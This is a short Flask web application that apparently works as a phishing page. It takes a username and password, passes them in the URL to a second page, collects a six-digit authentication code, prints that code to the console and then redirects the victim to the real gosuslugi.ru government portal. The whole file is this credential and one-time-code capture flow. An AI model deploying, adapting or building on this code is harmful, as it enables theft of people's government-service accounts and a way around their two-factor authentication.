from flask import Flask, render_template, request, redirect, url_for

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user_input = request.form['user_input']
        password = request.form['password']
        return redirect(url_for('authentication', user_input=user_input, password=password))
    return render_template('login.html')

@app.route('/authentication', methods=['GET', 'POST'])
def authentication():
    if request.method == 'POST':
        authentication_code1 = request.form['digit1']
        authentication_code2 = request.form['digit2']
        authentication_code3 = request.form['digit3']
        authentication_code4 = request.form['digit4']
        authentication_code5 = request.form['digit5']
        authentication_code6 = request.form['digit6']
        print("Authentication code:", authentication_code1, authentication_code2, authentication_code3, authentication_code4, authentication_code5, authentication_code6)
        return redirect("https://gosuslugi.ru/")
    return render_template('authentication.html')

if __name__ == '__main__':
    app.run(debug=True)
